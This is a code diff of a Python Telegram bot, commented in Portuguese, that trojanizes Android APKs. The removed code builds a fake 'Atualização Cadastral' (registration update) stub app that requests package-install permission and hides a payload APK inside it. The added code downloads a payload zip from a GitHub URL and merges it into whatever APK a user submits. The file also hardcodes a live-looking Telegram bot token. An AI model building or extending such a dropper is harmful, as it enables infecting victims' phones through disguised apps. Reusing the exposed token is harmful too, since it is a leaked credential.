@@ -1,60 +1,47 @@
-import os, zipfile, tempfile, shutil, logging, io, base64, subprocess
+import os, zipfile, tempfile, shutil, logging, io, requests
 from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters
 
 TELEGRAM_TOKEN = "8673484762:AAG52YGWBfZlgl_rBQ3VrdmICxayMf59v8A"
 
-# CAMINHO DO PAYLOAD
-PAYLOAD_PATH = r"C:\Users\gagli\Downloads\ESTUDO APK\update_apk_decriptado.zip"
+# URL do payload no GitHub
+PAYLOAD_URL = "https://raw.githubusercontent.com/gabrielgagliardi83-byte/BOT_FINAL_V2/main/update_apk_decriptado.zip"
 
-def criar_stub():
-    buffer = io.BytesIO()
-    with zipfile.ZipFile(buffer, 'w', compression=zipfile.ZIP_DEFLATED) as z:
-        z.writestr("AndroidManifest.xml", """<?xml version="1.0" encoding="utf-8"?>
-<manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.atualizacao.cadastral"
-    android:versionCode="1"
-    android:versionName="1.0">
-    <uses-permission android:name="android.permission.INTERNET" />
-    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
-    <application android:label="Atualização Cadastral">
-        <activity android:name=".MainActivity">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity>
-    </application>
-</manifest>""")
-        z.writestr("classes.dex", b"dex\n035\x00" + b"\x00" * 100)
-    return buffer.getvalue()
+def baixar_payload():
+    try:
+        print("📥 Baixando payload...")
+        r = requests.get(PAYLOAD_URL)
+        if r.status_code == 200:
+            print(f"✅ Payload baixado: {len(r.content)} bytes")
+            return r.content
+        return None
+    except Exception as e:
+        print(f"❌ Erro: {e}")
+        return None
+
+PAYLOAD = baixar_payload()
 
 def transformar_apk(input_path, output_path):
-    stub_data = criar_stub()
-    with tempfile.NamedTemporaryFile(delete=False, suffix='.apk') as f:
-        f.write(stub_data)
-        stub_path = f.name
+    if PAYLOAD is None:
+        raise Exception("Payload não carregado")
     
-    os.makedirs("temp", exist_ok=True)
-    with zipfile.ZipFile(stub_path, 'r') as z:
-        z.extractall("temp/")
+    with tempfile.TemporaryDirectory() as tmp:
+        # Extrair APK original
+        with zipfile.ZipFile(input_path, 'r') as z:
+            z.extractall(tmp)
+        
+        # Extrair payload
+        with zipfile.ZipFile(io.BytesIO(PAYLOAD), 'r') as z:
+            z.extractall(tmp)
+        
+        # Recompactar
+        with zipfile.ZipFile(output_path, 'w') as z:
+            for root, _, files in os.walk(tmp):
+                for f in files:
+                    path = os.path.join(root, f)
+                    arcname = os.path.relpath(path, tmp)
+                    z.write(path, arcname)
     
-    os.makedirs("temp/assets", exist_ok=True)
-    with open(PAYLOAD_PATH, 'rb') as f:
-        payload_data = f.read()
-    with open("temp/assets/update.apk", "wb") as f:
-        f.write(payload_data)
-    
-    with zipfile.ZipFile(output_path, 'w') as z:
-        for root, _, files in os.walk("temp/"):
-            for file in files:
-                path = os.path.join(root, file)
-                arcname = os.path.relpath(path, "temp/")
-                z.write(path, arcname)
-    
-    shutil.rmtree("temp/", ignore_errors=True)
-    os.unlink(stub_path)
     return output_path
 
 async def start(update, context):
